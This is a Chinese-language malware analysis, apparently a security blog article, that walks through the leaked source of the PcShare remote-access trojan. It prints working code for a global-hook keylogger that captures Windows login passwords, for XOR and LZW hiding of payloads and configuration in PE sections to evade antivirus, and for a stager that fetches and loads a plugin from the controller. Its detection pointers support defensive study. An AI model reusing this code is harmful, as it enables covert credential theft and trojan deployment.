# Pcshare远控源码偏重分析（一）

0x00背景
=====

![enter image description here](http://drops.javaweb.org/uploads/images/5a7e6ecd1fd49ae257178ded2d3b84ccee370aa0.jpg)

PcShare是一款功能强大的远程管理软件，可以在内网、外网任意位置随意管理需要的远程主机，该软件是由国内安全爱好者无可非议开发。在当时这款远控在大家应该比较熟悉了，VC编译器调出来的的小体积全功能木马。相比Delphi的灰鸽子真是碉堡了！

下面我们使用具有通用性的会员版本为例，进行源码分析。其他企业版本和2011版应该大同小异，有兴趣的可以自行研究。由于篇幅限制，我们主要关注一些关键代码流程，核心代码、及加密解密部分。

0x01 代码结构
=====

作者开源的源码包大致目录结构：

```
C:\PCSHARE
├─2011年版
├─企业定做
│  ├─PcLKey
│  ├─PcMain
│  ├─PcMake
│  ├─PcShare
│  └─PcStart
├─会员版本
│  ├─PcLKey
│  ├─PcMain
│  ├─PcMake
│  ├─PcShare
│  └─PcStart
├─版本工具
│  ├─FileInsert
│  ├─InSertPsString
│  ├─NetServer
│  ├─PcFileComb
│  ├─PcSocksServer
│  ├─PsProxy
│  ├─SrcModifyTool
│  ├─StrEntry
│  └─UpPcShare
└─界面资源
    ├─tool
    └─[XTreme.Toolkit.9.6.MFC].Xtreme.Toolkit.Pro.v9.60

```

文件大致作用：

PcLKey键盘记录插件

PcStart可执行安装主程序

PcMake 连接型DLL小马

PcMain 主功能控制插件

PcShare 主控程序带界面

我们先看下会员版本配置界面，然后在开始分析。你可以发现会员版本和早期拿到的版本不一样，有一个捆绑文件功能，而这个功能有一个亮点“压缩编码”。想知道？继续看

![enter image description here](http://drops.javaweb.org/uploads/images/7d70d24fc9df5ca70532b17d45555a4358c5874c.jpg)

PcLKey键盘记录插件 编译文件名：PcLkey.dll 这款键盘记录插件的特色就是可以记录中文英文等，而且可以尝试记录系统登录密码。服务启动SYSTEM权限的，登陆系统密码记录应该是支持XP/2003的，具体大家测测看。

以下是启动监控中文和英文及登录窗口输入记录，处理流程代码。 离线键盘记录数据文件以*.dll.txt存储，和dll一个目录。

```
    //数据文件名称
    *pEnd = 0x00;
    lstrcat(m_ModuleFileName, ".txt");
    strcpy(m_KeyFilePath, m_ModuleFileName);

    HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());

    //监控中文和英文
    HDESK hNewDesktop = OpenDesktop("Default", 0, FALSE, MAXIMUM_ALLOWED);
    if(hNewDesktop != NULL)
    {
        SetThreadDesktop(hNewDesktop);
    }

    if(NULL == g_hKeyHK_CN)
    {
        g_hKeyHK_CN = SetWindowsHookExW(WH_CALLWNDPROC, HOOK_WM_IME_COMPOSITION_Proc, ghInstance, 0);
    }
    if(NULL == g_hKeyHK_EN)
    {
        g_hKeyHK_EN = SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_Proc, ghInstance, 0);
    }

    GetModuleFileName(NULL, m_ModuleFileName, 255);
    CharLower(m_ModuleFileName);
    if(strstr(m_ModuleFileName, "svchost.exe") != NULL)
    {
        //监控登录窗口
        hNewDesktop = OpenDesktop("Winlogon", 0, FALSE, MAXIMUM_ALLOWED);
        if(hNewDesktop != NULL)
        {
            SetThreadDesktop(hNewDesktop);
        }
        if(NULL == g_hKeyHK_LG)
        {
            g_hKeyHK_LG = SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_LOGIN_Proc, ghInstance, 0);
        }
        SetThreadDesktop(hOldDesktop);
    }

```

英文记录核心代码：WH_GETMESSAGE全局钩子，大家的代码应该都差不多，这里主要是处理回车符和删除符。

```
LRESULT CALLBACK HOOK_WM_CHAR_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 )
    {
        PMSG pMsg = (PMSG) lParam;
        if(pMsg->message == WM_CHAR && wParam == PM_REMOVE && GetTickCount() - nCnKeyTimeOut > 5)
        {
            nEnKeyTimeOut = GetTickCount();
            switch(pMsg->wParam)
            {
                case VK_BACK:
                    InsertBuffer(L"[<=]", KEY_INSERT_NORMAL);
                    break;

                case VK_RETURN:
                    InsertBuffer(L"\r\n", KEY_INSERT_NORMAL);
                    break;

                default :
                    {
                        WCHAR m_Text[3] = {0};
                        memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
                        InsertBuffer(m_Text, KEY_INSERT_NORMAL);
                    }
                    break;
            }
        }
    }
    return CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

```

中文记录核心代码：主要用到WH_CALLWNDPROC全局钩子处理WM_IME_COMPOSITION消息，通过ImmGetCompositionStringW函数获取字符。

```
LRESULT CALLBACK HOOK_WM_IME_COMPOSITION_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
    CWPSTRUCT* pMsg = (CWPSTRUCT*) lParam;
    if(m_IsLogin)
    {
        //已经登录
        m_IsLogin = FALSE;

        //需要保存登录密码
        InsertBuffer(L"\r", KEY_INSERT_LOGIN_END);
        WCHAR m_UserName[256] = L"当前用户：";
        DWORD len = 256 - lstrlenW(m_UserName) - 1;
        GetUserNameW(m_UserName + lstrlenW(m_UserName), &len);
        lstrcatW(m_UserName, L" 用户密码：");
        InsertBuffer(m_UserName, KEY_INSERT_LOGIN_END);
        InsertBuffer(L"\n", KEY_INSERT_LOGIN_END);
    }

    if(nCode == HC_ACTION)
    {
        switch (pMsg->message)
        {
            case WM_IME_COMPOSITION:
            {
                if(GetTickCount() - nEnKeyTimeOut > 5)
                {
                    nCnKeyTimeOut = GetTickCount();
                    HWND hWnd = GetForegroundWindow();
                    HIMC hIMC = ImmGetContext(hWnd);
                    memset(g_srcBuf, 0, 256 * sizeof(WCHAR));
                    DWORD dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
                    ImmGetCompositionStringW(hIMC, GCS_RESULTSTR, g_srcBuf, dwSize);
                    if(StrCmpW(g_srcBuf, g_destBuf) != 0)
                    {
                        InsertBuffer(g_srcBuf, KEY_INSERT_NORMAL);
                        lstrcpyW(g_destBuf, g_srcBuf);
                    }
                    if(hIMC)
                    {
                        ImmReleaseContext(hWnd, hIMC);
                    }
                }
            }
            break;
        }
    }
    return(CallNextHookEx(g_hKeyHK_CN, nCode, wParam, lParam));
}

```

系统登录记录核心代码：这个和英文记录查不多主要涉及就是用户桌面切换，这里不需要处理回车因为按回车就等于点确定登陆了。

```
LRESULT CALLBACK HOOK_WM_CHAR_LOGIN_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
    //进入登录窗口
    if(nCode >= 0 )
    {
        PMSG pMsg = (PMSG) lParam;
        if(pMsg->message == WM_CHAR)
        {
            m_IsLogin = TRUE;
            switch(pMsg->wParam)
            {
                case VK_BACK:
                    InsertBuffer(L"[<=]", KEY_INSERT_LOGIN);
                    break;

                default :
                    {
                        WCHAR m_Text[3] = {0};
                        memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
                        InsertBuffer(m_Text, KEY_INSERT_LOGIN);
                    }
                    break;
            }
        }
    }
    return CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

```

PcStart可执行安装主程序 编译文件名：PcInit.exe

这个程序主要作用就是从EXE中释放DLL和SYS文件等，安装服务并调用执行主要功能DLL木马上线。早期这款远控特色就是有驱动，可以隐藏连接和注册表等。可惜这种泛滥Rootkit代码维持没多久就被杀毒列入监控范围，然后就没有然后了。

用户配置生成数据结构体，和配置器的需要定义的内容差不多。

```
// 该结构仅在生成肉鸡文件时使用，不用来通讯
// 该结构改成ANSI版的更好
typedef struct _PSDLLINFO_
{

//定长
    UINT m_ServerPort;
    UINT m_DelayTime;
    UINT m_IsDel;
    UINT m_IsKeyMon;
    UINT m_PassWord;
    UINT m_DllFileLen;
    UINT m_SysFileLen;
    UINT m_ComFileLen;
    UINT m_CreateFlag;
    UINT m_DirAddr;

//变长
    char m_ServerAddr[256];     // TCHAR to char [9/19/2007 zhaiyinwei]
    char m_DdnsUrl[256];
    char m_Title[64];
    char m_SysName[24];
    char m_ServiceName[24];     //服务名称
    char m_ServiceTitle[256];   //服务描述
    char m_ServiceView[32];     //服务显示名称
    char m_SoftVer[32];         //软件版本
    char m_Group[32];           //用户分组

//客户端保存
    UINT m_IsSys;
    UINT m_ExtInfo;
    char m_ID[18];
    char m_ExeFilePath[256];
}PSDLLINFO, *LPPSDLLINFO;

```

0x02 多功能的详解
=====

下面看看作者的debug版本调试用的代码，更形象一些。主要数据就是上线地址、端口、安装服务名称、服务显示名称、服务描述、上线分组、备注、重连超时、软件版本、上线密码等等

![enter image description here](http://drops.javaweb.org/uploads/images/71c46fc1f6040e2e1865aa33fef2d6c4f223de93.jpg)

下面这段代码可以看得出会员版本和普通版本区别，

1、使用的DLL不一样，会员版是完整版的DLL、普通版本是精简版的DLL。

2、主函数名的区别，会员版本是Vip20101125，免费版本是ServiceMain。

3、会员版本直接带完整控制插件DLL，免费版会先建立TCP连接传输控制插件（就是小马带大马减小体积），这个后续在提到。

![enter image description here](http://drops.javaweb.org/uploads/images/1c95cc1c972351b07175984d3b49ac43aab58ea6.jpg)

PcStart还有三处值得注意的亮点：

1 DLL和SYS文件数据加密存储，捆绑合并文件使用LZW编码压缩。避免被杀毒软件轻易的识别出捆绑（内置）PE文件，对躲避查杀有一定效果。但是有些强悍的杀毒还是能通过虚拟机脱壳或算法识别解码后将其藏匿的文件进行查杀。攻防最头痛莫过于对手太强大，所以现在手段不高明基本没有生存空间了。

```
FCLzw lzw;  
//附加信息数据
BYTE* pZipInfoData = ((BYTE*) pSaveInfo) + sizeof(MYSAVEFILEINFO);
DWORD nSrcInfoDataLen = 0;
BYTE* pSrcInfoData = NULL;
lzw.PcUnZip(pZipInfoData, &pSrcInfoData, &nSrcInfoDataLen);
CopyMemory(pInfo, pSrcInfoData, nSrcInfoDataLen);
delete [] pSrcInfoData;

if(IsFileComb)
{
    DWORD nSrcComDataLen = 0;
    BYTE* pZipComData = pZipInfoData + pSaveInfo->m_Size + pInfo->m_DllFileLen + pInfo->m_SysFileLen;
    BYTE* pComFileData = NULL;
    lzw.PcUnZip(pZipComData, &pComFileData, &nSrcComDataLen);
    delete [] pFileData;

    //修改原始文件
    while(1)
    {
        if(WriteMyFile(pCmdLines, pComFileData, nSrcComDataLen))
        {
            break;
        }
        Sleep(50);
    }

```

2 修改利用PE文件标志来识别文件类型，分析过程中我发现一处不错的思路。修改PE文件的标识“This program cannot be run in DOS mode.”中的“This”位置来标注这是一个什么类型文件，方便后期文件处理和执行。这是固定码可以将此处加入查杀特征库就可以识别了，快速扫描有点用，准确识别还是另外在找一处吧。

定义：

```
#define PS_START_WIN7       11001       //win7启动
#define PS_START_UPDATE     11002       //更新客户端
#define PS_START_FILECOMB   11003       //文件捆绑
#define PS_START_FILECOPY   11004       //文件捆绑拷贝

BYTE* GetCmdType()
{
    char m_FileName[256] = {0};
    GetModuleFileName(NULL, m_FileName, 255);
    HANDLE hFile = CreateFile(m_FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        return NULL;
    }
    DWORD nReadLen = 0;
    DWORD nFileLen = GetFileSize(hFile, NULL);
    CloseHandle(hFile);

    //修改标志
    //This
    char m_TempStr[256] = {0};
    m_TempStr[0] = 'T';
    m_TempStr[1] = 'h';
    m_TempStr[2] = 'i';
    m_TempStr[3] = 's';
    m_TempStr[4] = 0x00;

    //修改EXE数据标志
    BYTE* pData = (BYTE*) GetModuleHandle(NULL);
    BYTE* pCmd = NULL;
    for(DWORD i = 0; i < nFileLen; i++)
    {
        if(memcmp(&pData[i], m_TempStr, 4) == 0)
        {
            pCmd = (BYTE*) &pData[i + 4];
            break;
        }
    }
    return pCmd;
}

```

验证：

![enter image description here](http://drops.javaweb.org/uploads/images/25da3ee494c42080a431b43ac155d7c8981fcbd9.jpg)

3 运行成功后加密配置数据修改DLL 文件，生成一段随机作为Key。数据和Key异或加密存储，放在PE空区段里面。Pcshare多次利用空区段存放数据，用的时候在找标记“PS_VER_ULONGLONG”找大小在读取出来，避免“资源文件存文件”、“附加数据存文件”等传统捆绑打包和携带配置文件的方式，被杀毒启发式扫描检测出来。

```
//取随机数据
    srand((unsigned) time(NULL));
    for(i = 0; i < nInfoDataLen; i++)
    {
        pKeyData[i] = rand();
    }

    //加密数据
    for(i = 0; i < nInfoDataLen; i++)
    {
        pTmpData[i] = pTmpData[i] ^ pKeyData[i];
    }
    AddDataToPe(pSaveData, nInfoDataLen * 2 + nStrSize, pDllFileData, nSrcDllDataLen, m_DllFilePath);

```

AddDataToPe代码片段：

```
    // 新节的RVA
    pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

    //SizeOfRawData在EXE文件中是对齐到FileAlignMent的整数倍的值
    pNewSec->SizeOfRawData = DataLen;
    pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
    pNewSec->SizeOfRawData++;
    pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;

    // 设置新节的 PointerToRawData
    pNewSec->PointerToRawData = nPeLen;

    // 设置新节的属性
    pNewSec->Characteristics = 0x40000040;      //可读,，已初始化

    // 增加NumberOfSections
    pPE_Header->FileHeader.NumberOfSections++;

    // 增加SizeOfImage
    pPE_Header->OptionalHeader.SizeOfImage += 
        (pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
        pPE_Header->OptionalHeader.SectionAlignment;

    // 保存到文件
    HANDLE hFile = CreateFile(
        pPeFile,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL );

```

PcMake 连接型DLL小马 编译文件名：PcMake.dll

通过源码分析Pcshare共有3个插件1、控制插件（即：PcMain.dll） 2、键盘记录插件（PcLkey.dll） 3、Sock5代理插件 后两个插件是会员版本专享。

PcMake这个插件初始化连接是使用TCP连接到控制端，然后下载控制插件。会员版本采用直接捆绑打包PcMain.dll控制插件方式，所以体积上会大一些。

这个小马插件特色不多，下面我主要分析的解密配置信息部分代码和上线代码。

定义：

```
#define PS_VER_ULONGLONG        0x1234567812345678

BOOL MyMainFunc::GetFileSaveInfo(LPVOID pInfoData, DWORD nInfoLen, HINSTANCE hInst)
{
    //文件数据
    DWORD nReadLen = 0;
    char m_DllName[MAX_PATH] = {0};
    GetModuleFileName(hInst, m_DllName, 200);
    HANDLE hFile = CreateFile(m_DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    DWORD nFileLen = GetFileSize(hFile, NULL);
    BYTE* pFileData = new BYTE[nFileLen];
    ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
    CloseHandle(hFile);

    //查找存储文件标志
    BYTE* pSaveInfo = NULL;
    for(DWORD i = nFileLen - sizeof(ULONGLONG); i > sizeof(ULONGLONG); i--)
    {
        if(*(ULONGLONG*) &pFileData[i] == PS_VER_ULONGLONG)
        {
            pSaveInfo = &pFileData[i] + sizeof(ULONGLONG);
            break;
        }
    }
    if(pSaveInfo == NULL)
    {
        delete [] pFileData;
        return FALSE;
    }

    BYTE* pKeyData = pSaveInfo + sizeof(PSDLLINFO);
    CopyMemory(pInfoData, pSaveInfo, sizeof(PSDLLINFO));

    BYTE* pSrcData = (BYTE*) pInfoData;

    //还原数据
    for(i = 0; i < sizeof(PSDLLINFO); i++)
    {
        pSrcData[i] = pSrcData[i] ^ pKeyData[i];
    }
    delete [] pFileData;

    return TRUE;
}

```

运行后，查找存储配置的标志“0x1234567812345678”（PcStart成功执行后写入的配置信息），找到后将密钥和配置读取出来，循环所有配置加密数据和密钥进行异或Xor解密。

验证方法：16进制编辑工具搜索16进制“7856341278563412”

![enter image description here](http://drops.javaweb.org/uploads/images/cc2ab60d489db024553aab56ccb6a17e0273ffc2.jpg)

Ollydbg调试印证：

![enter image description here](http://drops.javaweb.org/uploads/images/f2b5726661a4f58264dfef7feeb5a016ce8d6e6e.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/4734278a91281b0765743d8c2f606b5f4e12ad7b.jpg)

```
#define PS_ENTRY_COMM_KEY       0xf7                //简单异或
#define PS_USER_ID          0x3030303030303030          //VIP版本

BOOL CMyClientTran::Create(DWORD nCmd, char* m_ServerAddr, UINT m_ServerPort, char* pUrl, UINT nPassWord)
{
    Close();

    StrCpy(m_Addr, m_ServerAddr);
    m_Port = m_ServerPort;

    //查看是否有ddns
    if(lstrlen(pUrl) != 0)
    {
        GetRealServerInfo(pUrl, m_Addr, &m_Port);
    }

    //连接到服务器
    m_Socket = GetConnectSocket(m_Addr, m_Port);
    if(m_Socket == NULL)
    {
        return FALSE;
    }

    //协商初始数据
    LOGININFO m_LoginInfo = {0};
    m_LoginInfo.m_Cmd = nCmd;
    m_LoginInfo.m_hWnd = (HWND) nPassWord;
    m_LoginInfo.m_UserId = PS_USER_ID;
    EncryptByte(&m_LoginInfo, sizeof(LOGININFO));
    return SendData(&m_LoginInfo, sizeof(LOGININFO));
}

void CMyClientTran::EncryptByte(LPVOID pData, DWORD nLen)
{
    BYTE* pTmpData = (BYTE*) pData;
    for(DWORD i = 0; i < nLen; i++)
    {
        pTmpData[i] = pTmpData[i] ^ PS_ENTRY_COMM_KEY;  
    }
}

```

连接控制端成功后发送软件版本和上线密码（传输的数据使用异或F7加密，有点弱爆的感觉。），然后从主控端下载控制插件。

![enter image description here](http://drops.javaweb.org/uploads/images/04c0ccaabb7d7ac6d4158fec0dc91e4b6b752f43.jpg)

```
void CMyWorkMoudle::MakeModFileMd5(LPCTSTR pFileName, BYTE* sMd5Str)
{
    HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        return;
    }

    DWORD nReadLen = 0;
    DWORD nFileLen = GetFileSize(hFile, NULL);
    BYTE* pFileData = new BYTE[nFileLen];
    ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
    CloseHandle(hFile);

    //校验本地文件
    MD5_CTX context = {0};
    MD5Init (&context);
    MD5Update (&context, pFileData, nFileLen);
    MD5Final (&context);

    //保存校验码
    CopyMemory(sMd5Str, &context, 16);

    delete [] pFileData;
}   

HMODULE CMyWorkMoudle::GetModFile(char* pFilePath, UINT nCmd)
{
    //MD5校验
    BYTE m_DllFileMd5[24] = {0};
    MakeModFileMd5(m_ModFilePath, m_DllFileMd5);

    //连接服务器，上送本地文件校验码
    CMyClientTran m_Tran;
    if(!m_Tran.Create(nCmd, m_DllInfo.m_ServerAddr, m_DllInfo.m_ServerPort, 
        m_DllInfo.m_DdnsUrl, m_DllInfo.m_PassWord) || !m_Tran.SendData(m_DllFileMd5, 16))
    {
        return NULL;
    }

    //接收文件长度
    DWORD nFileLen = 0;
    if(!m_Tran.RecvData(&nFileLen, sizeof(DWORD)))
    {
        return NULL;
    }

    //查看是否需要接收文件
    if(nFileLen == 0)
    {
        return LoadLibrary(pFilePath);
    }

    //接收文件
    BYTE* pFileData = new BYTE[nFileLen + 65535];
    ZeroMemory(pFileData, nFileLen + 65535);
    if(!m_Tran.RecvData(pFileData, nFileLen))
    {
        delete [] pFileData;
        return NULL;
    }

    //解压文件
    FCLzw lzw;
    if(!lzw.PcSaveData(pFileData, pFilePath))
    {
        delete [] pFileData;
        return NULL;
    }
    delete [] pFileData;

    //装载DLL文件
    return LoadLibrary(pFilePath);
}

```

校验插件文件完整性使用MD5算法，判断是否与控制端最新版本相符。相同则不在传输，貌似MD5算法目前不是太安全了吧。

0x03 文章小结
=====

Pcshare这款远控的代码规范方面还是比较工整的，代码缩进而且还有大量注释。非常适合初学入门和二次开发。据说早期有HTTP协议的版本但是现在代码丢失了，可惜了这款2010款是TCP版本对企业防火墙穿墙能力有限。比较有特色的思路：1、LZW编码压缩 2、改PE的DOS头“This”给文件做标记 3、利用空区段存放数据，看得出作者对安装用的EXE处理上花了不少功夫。

PcMain 主功能控制插件、PcShare 主控程序带界面将在第2篇中在分析，预知后事如何,请听下回分解。